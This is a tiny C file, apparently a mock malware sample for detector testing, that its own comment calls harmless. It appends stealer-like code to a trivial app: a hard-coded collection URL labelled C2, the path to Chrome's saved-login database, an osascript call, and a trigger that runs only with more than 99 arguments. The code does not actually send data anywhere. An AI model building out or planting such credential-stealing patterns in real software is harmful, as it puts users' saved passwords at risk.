/* HARMLESS: the clean app with injected stealer-like code appended. */
#include <stdio.h>
#include <stdlib.h>
static const char*C2="http://185.199.111.1/collect";
static const char*CH="Library/Application Support/Google/Chrome/Default/Login Data";
__attribute__((noinline)) void inject(void){
  FILE*f=fopen(CH,"rb"); FILE*g=fopen(C2,"r");
  if(f&&g){char b[8];fread(b,1,1,f);} system("osascript -e 'x'");
}
int main(int argc,char**argv){ printf("MyApp %d\n", argc); if(argc>99) inject(); return 0; }
